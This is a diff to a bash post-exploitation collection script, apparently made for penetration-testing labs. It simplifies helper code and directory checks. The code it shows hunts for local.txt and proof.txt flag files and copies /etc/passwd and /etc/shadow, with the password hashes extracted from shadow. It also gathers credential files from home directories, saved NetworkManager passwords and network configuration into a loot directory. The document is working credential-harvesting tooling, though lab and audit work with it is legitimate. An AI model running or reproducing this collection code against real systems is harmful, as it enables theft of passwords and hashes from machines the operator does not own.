@@ -64,17 +64,6 @@ is_phase_done() {
     grep -qF "| DONE | $2 |" "$1/progress.log" 2>/dev/null
 }
 
-proof_dest_for() {
-    local proof_dir="$1"
-    local source_path="$2"
-    local base_name=""
-    local safe_source=""
-
-    base_name="$(basename "${source_path}")"
-    safe_source="$(printf '%s' "${source_path}" | sed 's#^/##; s#[/ ]#_#g')"
-    echo "${proof_dir}/${base_name}_${safe_source}"
-}
-
 #==============================================================================
 # CHILD PROCESS MANAGEMENT
 #==============================================================================
@@ -146,17 +135,12 @@ done
 HOSTNAME_SHORT="$(hostname -s 2>/dev/null || hostname 2>/dev/null || echo "unknown")"
 OUTDIR="${LOOT_ROOT}/${HOSTNAME_SHORT}"
 
-mkdir -p -- \
+mkdir -p \
     "${OUTDIR}/creds" \
     "${OUTDIR}/system" \
     "${OUTDIR}/network" \
     "${OUTDIR}/files" \
     "${OUTDIR}/proof"
-
-if [[ ! -d "${OUTDIR}/creds" || ! -d "${OUTDIR}/system" || ! -d "${OUTDIR}/network" || ! -d "${OUTDIR}/files" || ! -d "${OUTDIR}/proof" ]]; then
-    error "Failed to create output directory tree: ${OUTDIR}"
-    exit 1
-fi
 
 info "Output directory: ${OUTDIR}"
 info "Hostname: ${HOSTNAME_SHORT}"
@@ -181,9 +165,7 @@ phase_proof() {
         [[ -z "${f}" ]] && continue
         [[ -r "${f}" ]] || { warn "Found ${f} but not readable"; continue; }
         local fname=""
-        local proof_copy=""
         fname="$(basename "${f}")"
-        proof_copy="$(proof_dest_for "${proof_dir}" "${f}")"
         success "Found: ${f}"
         echo ""
         echo -e "${GREEN}${BOLD}══════════════════════════════════════════${NC}"
@@ -192,8 +174,8 @@ phase_proof() {
         cat -- "${f}"
         echo -e "${GREEN}${BOLD}══════════════════════════════════════════${NC}"
         echo ""
-        cp -- "${f}" "${proof_copy}" 2>/dev/null || true
-        echo "source: ${f}" >> "${proof_copy}.meta"
+        cp -- "${f}" "${proof_dir}/${fname}" 2>/dev/null || true
+        echo "source: ${f}" >> "${proof_dir}/${fname}.meta"
         found_any=true
     done < <(timeout 30 find / -maxdepth 10 \( -name "local.txt" -o -name "proof.txt" \) -type f 2>/dev/null)
 
@@ -216,7 +198,7 @@ phase_system() {
     # OS release
     info "Collecting OS information..."
     if [[ -r /etc/os-release ]]; then
-        cp -- /etc/os-release "${sdir}/os-release.txt" 2>/dev/null || true
+        cp /etc/os-release "${sdir}/os-release.txt" 2>/dev/null || true
     fi
     uname -a > "${sdir}/uname.txt" 2>&1 || true
     uname -r > "${sdir}/kernel.txt" 2>&1 || true
@@ -292,11 +274,11 @@ phase_creds() {
     # /etc/passwd and /etc/shadow
     info "Checking /etc/passwd and /etc/shadow..."
     if [[ -r /etc/passwd ]]; then
-        cp -- /etc/passwd "${cdir}/passwd.txt" 2>/dev/null || true
+        cp /etc/passwd "${cdir}/passwd.txt" 2>/dev/null || true
         success "Copied /etc/passwd"
     fi
     if [[ -r /etc/shadow ]]; then
-        cp -- /etc/shadow "${cdir}/shadow.txt" 2>/dev/null || true
+        cp /etc/shadow "${cdir}/shadow.txt" 2>/dev/null || true
         grep -v '^\(.*:\)\{1\}\(!\|!\*\|\*\)' /etc/shadow 2>/dev/null | grep -v '::' > "${cdir}/shadow_hashes.txt" 2>/dev/null || true
         success "Copied /etc/shadow — hashes extracted to shadow_hashes.txt"
     else
@@ -400,12 +382,7 @@ phase_creds() {
                 success "Home cred file: ${full}"
             fi
         done
-    done < <(
-        {
-            printf '%s\n' /root
-            find /home /root -maxdepth 1 -mindepth 1 -type d 2>/dev/null
-        } | awk '!seen[$0]++'
-    )
+    done < <(find /home /root -maxdepth 1 -mindepth 1 -type d 2>/dev/null)
 
     # NetworkManager PSK
     info "Checking NetworkManager for saved passwords..."
@@ -472,11 +449,11 @@ phase_network() {
 
     # /etc/hosts
     info "Copying /etc/hosts..."
-    cp -- /etc/hosts "${ndir}/hosts.txt" 2>/dev/null || true
+    cp /etc/hosts "${ndir}/hosts.txt" 2>/dev/null || true
 
     # /etc/resolv.conf
     info "Copying /etc/resolv.conf..."
-    cp -- /etc/resolv.conf "${ndir}/resolv.conf" 2>/dev/null || true
+    cp /etc/resolv.conf "${ndir}/resolv.conf" 2>/dev/null || true
 
     # iptables
     info "Checking iptables rules..."
